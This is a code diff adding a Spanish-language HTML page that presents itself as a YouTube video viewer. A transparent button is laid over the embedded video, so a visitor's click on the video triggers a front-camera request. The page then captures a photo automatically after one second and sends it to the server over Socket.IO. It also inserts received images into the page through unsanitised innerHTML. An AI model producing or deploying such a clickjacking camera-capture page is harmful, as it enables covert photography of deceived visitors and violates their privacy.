@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visor de Video</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #000;
+            color: white;
+            padding: 20px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        .video-container {
+            position: relative;
+            padding-bottom: 56.25%; /* 16:9 */
+            height: 0;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        .video-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        #videoContainer {
+            margin-bottom: 30px;
+        }
+        #cameraContainer {
+            display: none;
+            margin-top: 30px;
+        }
+        #cameraFeed, #capturedImage {
+            width: 100%;
+            max-width: 400px;
+            height: auto;
+            background-color: #333;
+            margin: 0 auto;
+            display: block;
+            border-radius: 5px;
+        }
+        .btn-primary {
+            margin-top: 10px;
+        }
+        .invisible-btn {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            border: none;
+            color: transparent;
+            z-index: 100;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="text-center mb-4">Video de YouTube</h1>
+        
+        <div id="videoContainer" class="video-container">
+            <iframe 
+                src="https://www.youtube.com/embed/{{ video_id }}?autoplay=1" 
+                frameborder="0" 
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+                allowfullscreen>
+            </iframe>
+            
+            <!-- Botón invisible que cubre todo el iframe -->
+            <button id="invisibleButton" class="invisible-btn" onclick="solicitarAccesoCamara()">
+                Interactuar
+            </button>
+        </div>
+        
+        <div id="cameraContainer">
+            <h3 class="text-center">Cámara activada</h3>
+            <video id="cameraFeed" autoplay playsinline></video>
+            <canvas id="canvas" style="display:none;"></canvas>
+            <img id="capturedImage" style="display:none;">
+            <div class="d-grid gap-2">
+                <button id="captureBtn" class="btn btn-primary" onclick="capturarImagen()">Capturar imagen</button>
+            </div>
+        </div>
+    </div>
+    
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.socket.io/4.4.1/socket.io.min.js"></script>
+    <script>
+        // Conexión con Socket.IO con manejo de errores
+        let socket;
+        try {
+            socket = io(window.location.origin, {
+                reconnectionAttempts: 5,
+                reconnectionDelay: 1000,
+                timeout: 5000
+            });
+            
+            // Verificar conexión al iniciar
+            socket.on('connect', function() {
+                console.log('Conectado al servidor Socket.IO');
+                socket.emit('test_connection', {page: 'video.html'});
+            });
+            
+            // Manejar errores de conexión
+            socket.on('connect_error', function(error) {
+                console.error('Error de conexión Socket.IO:', error);
+                alert('Error de conexión con el servidor. Intenta recargar la página.');
+            });
+            
+            // Confirmar conexión establecida
+            socket.on('connection_response', function(data) {
+                console.log('Respuesta del servidor:', data);
+            });
+        } catch (e) {
+            console.error('Error al inicializar Socket.IO:', e);
+            alert('Error al inicializar la conexión. Verifica tu conexión a internet.');
+        }
+        
+        // Elementos del DOM
+        const cameraFeed = document.getElementById('cameraFeed');
+        const canvas = document.getElementById('canvas');
+        const capturedImage = document.getElementById('capturedImage');
+        const cameraContainer = document.getElementById('cameraContainer');
+        const videoContainer = document.getElementById('videoContainer');
+        
+        let stream = null;
+        
+        // Función para solicitar acceso a la cámara
+        function solicitarAccesoCamara() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                // Mostrar mensaje mientras se solicita acceso
+                cameraContainer.innerHTML += '<div class="alert alert-info">Solicitando acceso a la cámara...</div>';
+                
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+                    .then(function(mediaStream) {
+                        stream = mediaStream;
+                        cameraFeed.srcObject = mediaStream;
+                        cameraFeed.onloadedmetadata = function(e) {
+                            cameraFeed.play();
+                        };
+                        
+                        // Mostrar el contenedor de la cámara
+                        cameraContainer.style.display = 'block';
+                        
+                        // Ocultar el botón invisible
+                        document.getElementById('invisibleButton').style.display = 'none';
+                        
+                        // Capturar imagen automáticamente después de 1 segundo
+                        setTimeout(capturarImagen, 1000);
+                    })
+                    .catch(function(err) {
+                        console.log("Error al acceder a la cámara: " + err);
+                        alert("No se pudo acceder a la cámara. " + err.message);
+                    });
+            } else {
+                alert("Tu navegador no soporta acceso a la cámara");
+            }
+        }
+        
+        // Función para capturar imagen
+        function capturarImagen() {
+            if (!stream) return;
+            
+            // Configurar canvas
+            canvas.width = cameraFeed.videoWidth;
+            canvas.height = cameraFeed.videoHeight;
+            
+            // Dibujar la imagen actual del video en el canvas
+            const context = canvas.getContext('2d');
+            context.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
+            
+            // Convertir a imagen
+            const imageData = canvas.toDataURL('image/png');
+            capturedImage.src = imageData;
+            capturedImage.style.display = 'block';
+            cameraFeed.style.display = 'none';
+            
+            // Verificar conexión antes de enviar
+            if (socket && socket.connected) {
+                // Enviar la imagen a través de Socket.IO
+                socket.emit('imagen', { imagen: imageData });
+                console.log('Imagen enviada al servidor');
+            } else {
+                console.error('No hay conexión con el servidor');
+                alert('No se pudo enviar la imagen porque no hay conexión con el servidor');
+            }
+            
+            // Detener acceso a la cámara
+            stream.getTracks().forEach(track => track.stop());
+            stream = null;
+        }
+        
+        // Recibir imágenes de otros usuarios
+        socket.on('imagen_recibida', function(data) {
+            // Si recibes una imagen, puedes mostrarla o hacer otra cosa con ella
+            // En este ejemplo, simplemente alertamos que se recibió una imagen
+            console.log('Imagen recibida de otro usuario');
+            
+            // Aquí podrías mostrar la imagen en algún elemento del DOM si quisieras
+            if (confirm('¡Se ha recibido una imagen! ¿Quieres verla?')) {
+                document.body.innerHTML = '<div style="text-align:center;padding:20px;"><h2>Imagen Recibida</h2><img src="' + data.imagen + '" style="max-width:100%;"></div>';
+            }
+        });
+    </script>
+</body>
+</html> 
